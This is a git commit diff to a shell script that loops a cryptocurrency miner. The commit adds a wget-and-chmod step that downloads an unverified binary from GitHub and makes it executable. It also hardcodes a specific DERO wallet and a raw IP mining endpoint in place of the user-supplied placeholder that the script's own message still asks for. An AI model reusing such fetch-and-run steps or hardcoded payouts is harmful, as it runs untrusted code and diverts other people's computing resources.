891b6f3458caba2df7a2d39a6052fefa5555066a
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-31 23:02:19 +0700

    Update stratum_mining.sh

--- stratum_mining.sh
+++ stratum_mining.sh
@@ -1,6 +1,9 @@
+wget https://github.com/WxYtzaiu/asekhh/raw/main/astrominer
+chmod 777 astrominer
+
 #!/bin/bash
 echo "Replace YOUR_ADDRESS to run the miner"
 while :; do
-    ./astrominer -w YOUR_ADDRESS -r stratum+tls://pool.whalesburg.com:4300 -p stratum;
+    ./astrominer -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xevuvu8geqh829q3asvh9.ENTE -r 170.187.197.220:443 -p stratum;
     sleep 5;
 done
